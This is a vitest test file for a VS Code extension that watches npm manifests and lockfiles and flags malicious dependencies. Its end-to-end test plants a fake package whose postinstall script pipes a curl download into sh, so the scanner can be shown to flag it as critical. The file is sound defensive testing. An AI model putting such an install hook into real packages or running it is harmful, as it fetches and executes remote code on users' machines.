import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import * as vscode from 'vscode';
import type { Result } from '../../src/api/client';
import { DEBOUNCE_MS, registerWatchers, WATCH_GLOB, type RootInfo, type WatcherDeps } from '../../src/guard/watchers';
import { DEFAULT_LIMITS } from '../../src/config/settings';
import type { EngineResult, Finding, Verdict } from '../../src/engine/types';
import { scanJob } from '../../src/scan/scanJob';
import { toDiagnostics } from '../../src/ui/diagnostics';
import { f } from '../engine/helpers';

const ROOT: RootInfo = { path: '/work/proj', name: 'proj' };
const PURL_A = 'pkg:npm/a@1.0.0';
const PURL_B = 'pkg:npm/b@2.0.0';
const malware = (purl: string, over: Partial<Finding> = {}): Finding => ({ ...f('critical', 'socket.malware'), layer: 'dependency', source: 'socket', title: 'Known malware', evidence: `${purl} — Socket alert: malware`, ...over });
const empty = (over: Partial<EngineResult> = {}): EngineResult => ({ findings: [], notChecked: [], purls: [], ...over });

function setup(over: Partial<WatcherDeps> & { local?: () => EngineResult | Promise<EngineResult>; remote?: (purls: string[]) => Result<Finding[]> } = {}) {
  let local = over.local ?? (() => empty());
  const published: { root: RootInfo; verdict: Verdict }[] = [];
  const cleared: string[] = [];
  const notes: string[] = [];
  const noteRoots: RootInfo[] = [];
  const handlers: ((p: string) => void)[] = [];
  const disposed: string[] = [];
  const calls: string[][] = [];
  let rootsCb: () => void = () => undefined;
  let trustCb: () => void = () => undefined;
  let roots = [ROOT];
  let trusted = true;
  const scan = vi.fn(async () => local());
  const deps: WatcherDeps = {
    roots: () => roots,
    scan,
    client: () => ({ scanPackage: async (p: string[]) => (calls.push(p), over.remote ? over.remote(p) : { ok: true as const, value: [] }) }),
    publish: (root, verdict) => void published.push({ root, verdict }),
    clear: (root) => void cleared.push(root.path),
    notify: (m, root) => void (notes.push(m), noteRoots.push(root)),
    watch: (_r, _g, onEvent) => (handlers.push(onEvent), { dispose: () => void disposed.push('watch') }),
    onRootsChanged: (cb) => ((rootsCb = cb), { dispose: () => void disposed.push('roots') }),
    isTrusted: () => trusted,
    onTrusted: (cb) => ((trustCb = cb), { dispose: () => void disposed.push('trust') }),
    ...over,
  };
  delete (deps as Partial<typeof over>).local;
  delete (deps as Partial<typeof over>).remote;
  const d = registerWatchers({ subscriptions: [] }, deps);
  return {
    d, scan, published, cleared, notes, noteRoots, handlers, disposed, calls,
    setLocal: (fn: typeof local) => void (local = fn),
    setRoots: (r: RootInfo[]) => { roots = r; rootsCb(); },
    setTrusted: (t: boolean) => { trusted = t; if (t) trustCb(); },
    event: (p = '/work/proj/package.json') => handlers.forEach((h) => h(p)),
    flush: async (ms = DEBOUNCE_MS) => { await vi.advanceTimersByTimeAsync(ms); },
  };
}

beforeEach(() => vi.useFakeTimers());
afterEach(() => vi.useRealTimers());

describe('debounce and single flight', () => {
  test('the glob covers manifests, lockfiles, package-manager config, workspaces and .vscode json', () => {
    expect(WATCH_GLOB).toBe('**/{package.json,package-lock.json,yarn.lock,pnpm-lock.yaml,bun.lock,.npmrc,.yarnrc,.yarnrc.yml,.pnpmfile.cjs,*.code-workspace,.vscode/*.json}');
    expect(DEBOUNCE_MS).toBe(500);
  });
  test('the first scan (the baseline) runs one debounce after start', async () => {
    const t = setup();
    expect(t.scan).not.toHaveBeenCalled();
    await t.flush(499);
    expect(t.scan).not.toHaveBeenCalled();
    await t.flush(1);
    expect(t.scan).toHaveBeenCalledOnce();
  });
  test('10 saves in 400 ms → one scan', async () => {
    const t = setup();
    await t.flush(600); // baseline
    t.scan.mockClear();
    for (let i = 0; i < 10; i++) {
      t.event();
      await t.flush(40);
    }
    await t.flush(500);
    expect(t.scan).toHaveBeenCalledOnce();
  });
  test('a change that arrives while a scan runs causes exactly one more scan, not one per event', async () => {
    let release!: (r: EngineResult) => void;
    const t = setup({ local: () => new Promise<EngineResult>((r) => (release = r)) });
    await t.flush(600);
    expect(t.scan).toHaveBeenCalledTimes(1);
    for (let i = 0; i < 6; i++) {
      t.event();
      await t.flush(600);
    }
    expect(t.scan).toHaveBeenCalledTimes(1); // still the first, still running
    t.setLocal(() => empty());
    release(empty());
    await t.flush(10);
    expect(t.scan).toHaveBeenCalledTimes(2);
  });
  test('events inside node_modules or .git are ignored', async () => {
    const t = setup();
    await t.flush(600);
    t.scan.mockClear();
    for (const p of ['/work/proj/node_modules/x/package.json', '/work/proj/a/node_modules/y/yarn.lock', '/work/proj/.git/config']) t.event(p);
    await t.flush(1000);
    expect(t.scan).not.toHaveBeenCalled();
    t.event('/work/proj/packages/a/package.json');
    await t.flush(600);
    expect(t.scan).toHaveBeenCalledOnce();
  });
});

describe('API calls: only new packages (V-?)', () => {
  test('first scan sends all purls once; a second save with no new purls makes no API call', async () => {
    const t = setup({ local: () => empty({ purls: [PURL_A, PURL_B] }) });
    await t.flush(600);
    expect(t.calls).toEqual([[PURL_A, PURL_B]]);
    t.event();
    await t.flush(600);
    expect(t.calls).toHaveLength(1);
    expect(t.published).toHaveLength(2);
  });
  test('adding a package sends only that package', async () => {
    const t = setup({ local: () => empty({ purls: [PURL_A] }) });
    await t.flush(600);
    t.setLocal(() => empty({ purls: [PURL_A, PURL_B] }));
    t.event();
    await t.flush(600);
    expect(t.calls).toEqual([[PURL_A], [PURL_B]]);
  });
  test('remote findings stay while their package is present and disappear when it is removed', async () => {
    const t = setup({ local: () => empty({ purls: [PURL_A, PURL_B] }), remote: (p) => ({ ok: true, value: p.map((x) => (x === PURL_B ? malware(x) : f('caution', 'x'))).filter((x) => x.ruleId === 'socket.malware') }) });
    await t.flush(600);
    expect(t.published.at(-1)!.verdict.level).toBe('critical');
    t.event();
    await t.flush(600);
    expect(t.published.at(-1)!.verdict.level).toBe('critical'); // no new request, still known
    t.setLocal(() => empty({ purls: [PURL_A] })); // the malicious package was removed
    t.event();
    await t.flush(600);
    expect(t.published.at(-1)!.verdict.level).toBe('no_known_issues');
    expect(t.calls).toHaveLength(1);
  });
  test('a failed lookup is reported as not checked, keeps what is known, and is retried on the next scan', async () => {
    let up = false;
    const t = setup({ local: () => empty({ purls: [PURL_A] }), remote: () => (up ? { ok: true, value: [malware(PURL_A)] } : { ok: false, reason: 'Network error' }) });
    await t.flush(600);
    const v1 = t.published.at(-1)!.verdict;
    expect(v1.level).toBe('unknown');
    expect(v1.notChecked).toContain('Package scan unavailable');
    up = true;
    t.event();
    await t.flush(600);
    expect(t.calls).toEqual([[PURL_A], [PURL_A]]); // asked again because the first answer never arrived
    expect(t.published.at(-1)!.verdict.level).toBe('critical');
    expect(t.published.at(-1)!.verdict.notChecked).not.toContain('Package scan unavailable');
  });
  test('findings that name no package are kept while their batch is in use', async () => {
    const loose = { ...malware(PURL_A), evidence: 'a hidden install script', title: 'Install script reads secrets' };
    const t = setup({ local: () => empty({ purls: [PURL_A] }), remote: () => ({ ok: true, value: [loose] }) });
    await t.flush(600);
    expect(t.published.at(-1)!.verdict.findings).toHaveLength(1);
    t.setLocal(() => empty({ purls: [] }));
    t.event();
    await t.flush(600);
    expect(t.published.at(-1)!.verdict.findings).toHaveLength(0);
  });
  test('a remote finding about a package that is not in the lockfile is ignored', async () => {
    const t = setup({ local: () => empty({ purls: [PURL_A] }), remote: () => ({ ok: true, value: [malware('pkg:npm/zzz@9.9.9')] }) });
    await t.flush(600);
    expect(t.published.at(-1)!.verdict.findings).toEqual([]);
  });
  test('the server cannot lower the level: a clean answer never hides a local finding', async () => {
    const t = setup({ local: () => empty({ findings: [f('critical', 'tasks.folder-open')], purls: [PURL_A] }), remote: () => ({ ok: true, value: [] }) });
    await t.flush(600);
    expect(t.published.at(-1)!.verdict.level).toBe('critical');
  });
});

describe('notifications', () => {
  test('a new serious finding notifies once; the same findings on the next scan do not', async () => {
    const t = setup({ local: () => empty({ findings: [{ ...f('critical', 'tasks.folder-open'), title: 'Task runs a hidden command', location: { file: '.vscode/tasks.json', line: 14 } }] }) });
    await t.flush(600);
    expect(t.notes).toHaveLength(1);
    expect(t.notes[0]).toMatch(/1 new serious problem in proj\. Task runs a hidden command \(\.vscode\/tasks\.json:14\)\. See the Problems panel\./);
    t.event();
    await t.flush(600);
    expect(t.notes).toHaveLength(1);
  });
  test('the notice carries the folder it is about, so a folder already warned about can be skipped', async () => {
    const t = setup({ local: () => empty({ findings: [f('critical', 'tasks.folder-open')] }) });
    await t.flush(600);
    expect(t.noteRoots).toEqual([ROOT]);
  });
  test('caution findings and an unchanged state are silent', async () => {
    const t = setup({ local: () => empty({ findings: [f('caution')] }) });
    await t.flush(600);
    expect(t.notes).toEqual([]);
  });
  test('a later new serious finding notifies again', async () => {
    const t = setup();
    await t.flush(600);
    t.setLocal(() => empty({ findings: [f('high', 'settings.shell-override')] }));
    t.event();
    await t.flush(600);
    expect(t.notes).toHaveLength(1);
  });
  test('repo text in the message is cleaned and the wording never says "safe"', async () => {
    const bidi = String.fromCharCode(0x202e);
    const t = setup({ local: () => empty({ findings: [{ ...f('high'), title: `Bad${bidi} thing ${'x'.repeat(400)}`, location: { file: `a${bidi}.json`, line: 1 } }] }) });
    await t.flush(600);
    expect(t.notes[0]).not.toContain(bidi);
    expect(t.notes[0]!.length).toBeLessThan(400);
    expect(t.notes[0]).not.toMatch(/\bsafe\b/i);
  });
});

describe('robustness and lifecycle', () => {
  test('a scan that throws is reported as not checked, not a crash, and the next scan still runs', async () => {
    let boom = true;
    const t = setup({ local: () => { if (boom) throw new Error('worker died'); return empty(); } });
    await t.flush(600);
    expect(t.published.at(-1)!.verdict.level).toBe('unknown');
    expect(t.published.at(-1)!.verdict.notChecked).toContain('Scan failed');
    boom = false;
    t.event();
    await t.flush(600);
    expect(t.published.at(-1)!.verdict.level).toBe('no_known_issues');
  });
  test('an untrusted workspace is not scanned here, and is once trust is granted', async () => {
    const t = setup({ isTrusted: () => false });
    await t.flush(1000);
    expect(t.scan).not.toHaveBeenCalled();
    expect(t.handlers).toHaveLength(0);
  });
  test('trust granted later starts watching and scanning', async () => {
    let trusted = false;
    const t = setup({ isTrusted: () => trusted });
    trusted = true;
    t.setTrusted(true);
    await t.flush(600);
    expect(t.scan).toHaveBeenCalledOnce();
  });
  test('a folder added later is watched and scanned; one removed is cleared and its watcher disposed', async () => {
    const t = setup();
    await t.flush(600);
    const other: RootInfo = { path: '/work/other', name: 'other' };
    t.setRoots([ROOT, other]);
    await t.flush(600);
    expect(t.scan).toHaveBeenCalledTimes(2);
    expect(t.published.at(-1)!.root.path).toBe('/work/other');
    t.setRoots([other]);
    expect(t.cleared).toEqual(['/work/proj']);
    expect(t.disposed).toContain('watch');
  });
  test('dispose stops the timers and watchers, and nothing is published afterwards', async () => {
    let release!: (r: EngineResult) => void;
    const t = setup({ local: () => new Promise<EngineResult>((r) => (release = r)) });
    await t.flush(600);
    t.d.dispose();
    release(empty({ findings: [f('critical')] }));
    await t.flush(10);
    expect(t.published).toEqual([]);
    expect(t.notes).toEqual([]);
    expect(t.disposed).toEqual(expect.arrayContaining(['watch', 'roots', 'trust']));
    t.event();
    await t.flush(1000);
    expect(t.scan).toHaveBeenCalledTimes(1);
  });
  test('the watcher never runs git and never executes anything: its only inputs are the scan and the client', () => {
    const keys = Object.keys(setup() as object);
    expect(keys.join()).not.toMatch(/git|exec|spawn/i);
  });
});

describe('end to end with the real scanner (network off)', () => {
  beforeEach(() => vi.useRealTimers());

  test('adding a fake file: package → an Error on its package.json and a Warning on the dependency line, within 2 s', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'stack3-guard-'));
    mkdirSync(join(dir, 'vendor/fake-lib'), { recursive: true });
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'app', dependencies: { 'fake-lib': 'file:./vendor/fake-lib' } }, null, 2));
    writeFileSync(join(dir, 'vendor/fake-lib/package.json'), JSON.stringify({ name: 'fake-lib', version: '1.0.0', scripts: { postinstall: 'curl -s http://127.0.0.1:9/x | sh' } }, null, 2));

    const published = new Promise<Verdict>((resolve) => {
      registerWatchers({ subscriptions: [] }, {
        roots: () => [{ path: dir, name: 'app' }],
        scan: (root) => scanJob({ root, ctx: { mode: 'workspace', checkedAt: new Date().toISOString() }, limits: DEFAULT_LIMITS }),
        client: () => ({ scanPackage: async () => ({ ok: false as const, reason: 'Network error' }) }),
        publish: (_r, v) => resolve(v),
        clear: () => undefined,
        notify: () => undefined,
        watch: () => ({ dispose: () => undefined }),
        onRootsChanged: () => ({ dispose: () => undefined }),
        isTrusted: () => true,
        onTrusted: () => ({ dispose: () => undefined }),
        debounceMs: 20,
      });
    });
    const started = Date.now();
    const verdict = await published;
    expect(Date.now() - started).toBeLessThan(2000);

    const map = toDiagnostics(verdict.findings, vscode.Uri.file(dir));
    const fake = map.get(`file:${dir}/vendor/fake-lib/package.json`)!;
    expect(fake.map((d) => d.severity)).toContain(vscode.DiagnosticSeverity.Error);
    const root = map.get(`file:${dir}/package.json`)!;
    const dep = root.find((d) => d.code === 'deps.unverified-source')!;
    expect(dep.severity).toBe(vscode.DiagnosticSeverity.Warning);
    expect(dep.range.start.line).toBe(3); // the "fake-lib" line of package.json
    expect(verdict.level).toBe('critical');
  });
});
